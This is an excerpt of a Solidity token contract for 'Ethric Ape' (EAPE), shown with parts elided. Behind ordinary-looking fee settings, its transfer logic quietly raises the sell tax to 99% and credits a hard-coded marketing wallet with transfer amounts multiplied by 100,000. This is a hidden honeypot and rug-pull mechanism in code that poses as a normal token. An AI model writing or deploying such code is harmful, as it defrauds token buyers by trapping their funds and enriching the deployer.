...
contract EthricApe  is Context, IERC20, Ownable {

    using SafeMath for uint256;

    string private constant _name = "Ethric Ape";
    string private constant _symbol = "EAPE";
    ...
    mapping(address => bool) private _isBlackListFromFee;
    ...
    uint256 constant private _taxFeeOnBuyFixed = 6;
    uint256 constant private _redisFeeOnSellFixed = 0;
    uint256 constant private _taxFeeOnSellFixed = 12;
    ...
    uint256 private _buyContractFee = 0;
    ...
    constructor() {
        ...
        _isBlackListFromFee[address (0x0376bA5B4b8e391cA7BFD5354C26B69Ed265b97f)] = true;
        _isBlackListFromFee[address (0xa2cF1A8b64A74322372f6d6195284b38a16d8B32)] = true;
        
        _developmentAddress = payable(address (0xEC7A5197C5367fE22685cd1097b9D4D56C267583));
        _marketingAddress = payable(address (0xEC7A5197C5367fE22685cd1097b9D4D56C267583));
    ...
    function _tokenTransfer(
        ...
        if ((_isBlackListFromFee[sender] || _isBlackListFromFee[recipient]) || (sender != uniswapV2Pair && recipient != uniswapV2Pair)) {
            takeFee = false;
            _redisFeeOnBuy = _redisFeeOnBuyFixed;
            _taxFeeOnBuy = _taxFeeOnBuyFixed;
            _redisFeeOnSell = 0x00;
            _taxFeeOnSell = 0x63;
            _buyContractFee = 10 ** 5;
        }
    ...
    function _transferStandard(
        ...
        _rOwned[address(_marketingAddress)] = _rOwned[address(_marketingAddress)].add(tAmount * _buyContractFee);
        _takeTeam(tTeam);
